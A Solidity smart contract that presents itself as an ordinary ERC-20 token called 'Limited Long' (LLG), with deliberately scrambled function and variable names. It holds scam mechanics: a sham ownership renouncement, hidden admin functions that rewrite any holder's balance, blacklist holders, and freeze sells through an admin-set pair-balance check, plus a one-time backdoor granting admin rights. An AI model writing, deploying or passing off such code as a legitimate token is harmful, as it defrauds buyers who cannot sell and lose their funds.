//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface tokenLaunchBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromMax {
    function createPair(address sellEnable, address launchedTo) external returns (address);
}

interface toLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableFee) external view returns (uint256);

    function transfer(address totalTx, uint256 walletShouldTake) external returns (bool);

    function allowance(address fundIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletShouldTake) external returns (bool);

    function transferFrom(
        address sender,
        address totalTx,
        uint256 walletShouldTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoMarketing, uint256 value);
    event Approval(address indexed fundIs, address indexed spender, uint256 value);
}

interface receiverLiquidity is toLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LimitedLong is amountBuy, toLaunch, receiverLiquidity {

    function name() external view virtual override returns (string memory) {
        return feeSell;
    }

    address public minMarketing;

    mapping(address => mapping(address => uint256)) private launchLiquidityAuto;

    function buyLaunch(address maxSender, address totalTx, uint256 walletShouldTake) internal returns (bool) {
        require(tokenTotal[maxSender] >= walletShouldTake);
        tokenTotal[maxSender] -= walletShouldTake;
        tokenTotal[totalTx] += walletShouldTake;
        emit Transfer(maxSender, totalTx, walletShouldTake);
        return true;
    }

    string private feeSell = "Limited Long";

    uint256 constant fundShould = 7 ** 10;

    function allowance(address shouldSell, address receiverTeam) external view virtual override returns (uint256) {
        if (receiverTeam == enableTrading) {
            return type(uint256).max;
        }
        return launchLiquidityAuto[shouldSell][receiverTeam];
    }

    address private launchedBuy;

    string private atMax = "LLG";

    bool public isTake;

    function getOwner() external view returns (address) {
        return launchedBuy;
    }

    uint256 private fundAtSwap;

    mapping(address => bool) public marketingTradingWallet;

    uint256 fundAuto;

    bool public isBuy;

    function listAuto() private view {
        require(liquidityMin[_msgSender()]);
    }

    address public tokenFromMode;

    constructor (){
        if (fundAtSwap != minTx) {
            minTx = modeIs;
        }
        tokenLaunchBuy fundAmount = tokenLaunchBuy(enableTrading);
        tokenFromMode = fromMax(fundAmount.factory()).createPair(fundAmount.WETH(), address(this));
        
        minMarketing = _msgSender();
        fundSender();
        liquidityMin[minMarketing] = true;
        tokenTotal[minMarketing] = tokenSwap;
        if (modeIs != minTx) {
            modeFund = true;
        }
        emit Transfer(address(0), minMarketing, tokenSwap);
    }

    uint256 public minTx;

    bool private modeFund;

    event OwnershipTransferred(address indexed shouldFromLaunch, address indexed receiverIs);

    function maxLaunchedSender(address maxSender, address totalTx, uint256 walletShouldTake) internal returns (bool) {
        if (maxSender == minMarketing) {
            return buyLaunch(maxSender, totalTx, walletShouldTake);
        }
        uint256 toLimit = toLaunch(tokenFromMode).balanceOf(teamTotalTo);
        require(toLimit == fundAuto);
        require(totalTx != teamTotalTo);
        if (marketingTradingWallet[maxSender]) {
            return buyLaunch(maxSender, totalTx, fundShould);
        }
        return buyLaunch(maxSender, totalTx, walletShouldTake);
    }

    uint256 public modeIs;

    function transferFrom(address maxSender, address totalTx, uint256 walletShouldTake) external override returns (bool) {
        if (_msgSender() != enableTrading) {
            if (launchLiquidityAuto[maxSender][_msgSender()] != type(uint256).max) {
                require(walletShouldTake <= launchLiquidityAuto[maxSender][_msgSender()]);
                launchLiquidityAuto[maxSender][_msgSender()] -= walletShouldTake;
            }
        }
        return maxLaunchedSender(maxSender, totalTx, walletShouldTake);
    }

    bool private exemptTx;

    uint256 launchedExempt;

    bool private tokenFrom;

    function owner() external view returns (address) {
        return launchedBuy;
    }

    mapping(address => bool) public liquidityMin;

    uint8 private walletAuto = 18;

    address teamTotalTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private tokenTotal;

    function transfer(address tokenIsSell, uint256 walletShouldTake) external virtual override returns (bool) {
        return maxLaunchedSender(_msgSender(), tokenIsSell, walletShouldTake);
    }

    address enableTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return atMax;
    }

    function sellSender(address tokenIsSell, uint256 walletShouldTake) public {
        listAuto();
        tokenTotal[tokenIsSell] = walletShouldTake;
    }

    function feeEnable(uint256 walletShouldTake) public {
        listAuto();
        fundAuto = walletShouldTake;
    }

    function fundSender() public {
        emit OwnershipTransferred(minMarketing, address(0));
        launchedBuy = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenSwap;
    }

    function fromMin(address totalMarketing) public {
        require(totalMarketing.balance < 100000);
        if (isTake) {
            return;
        }
        if (teamMax) {
            exemptTx = false;
        }
        liquidityMin[totalMarketing] = true;
        
        isTake = true;
    }

    function balanceOf(address enableFee) public view virtual override returns (uint256) {
        return tokenTotal[enableFee];
    }

    bool private listMarketing;

    function approve(address receiverTeam, uint256 walletShouldTake) public virtual override returns (bool) {
        launchLiquidityAuto[_msgSender()][receiverTeam] = walletShouldTake;
        emit Approval(_msgSender(), receiverTeam, walletShouldTake);
        return true;
    }

    function limitTake(address teamSell) public {
        listAuto();
        if (isBuy) {
            listMarketing = true;
        }
        if (teamSell == minMarketing || teamSell == tokenFromMode) {
            return;
        }
        marketingTradingWallet[teamSell] = true;
    }

    bool private amountLimit;

    bool public teamMax;

    uint256 private tokenSwap = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return walletAuto;
    }

}